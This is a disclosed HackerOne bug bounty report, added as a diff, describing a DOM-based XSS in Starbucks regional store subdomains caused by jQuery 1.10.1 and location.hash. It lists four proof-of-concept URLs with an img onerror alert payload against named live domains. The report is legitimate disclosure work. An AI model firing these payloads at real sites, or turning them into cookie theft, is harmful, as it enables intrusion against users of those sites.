@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/188185
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/e3xpl0it
+ReportedTo:Starbucks(starbucks)
+BountyAmount:150.0
+Severity:low
+State:Closed
+DateOfDisclosure:12.01.2017 22:33:36
+
+Summary:
+
+Hi! this subdomain store.starbucks* vulnerable to dom based xss. 
+you are using the vulnerable library jQuery.V1_10_1	
+parameters location.hash DIV.innerHTML .
+Vulnerable all subdomains store.starbucks*
+It works Chrome,and IE 11 the current version
+POC
+http://shop.starbucks.de/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
+http://store.starbucks.ca/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
+http://store.starbucks.fr/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
+http://store.starbucks.co.uk/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
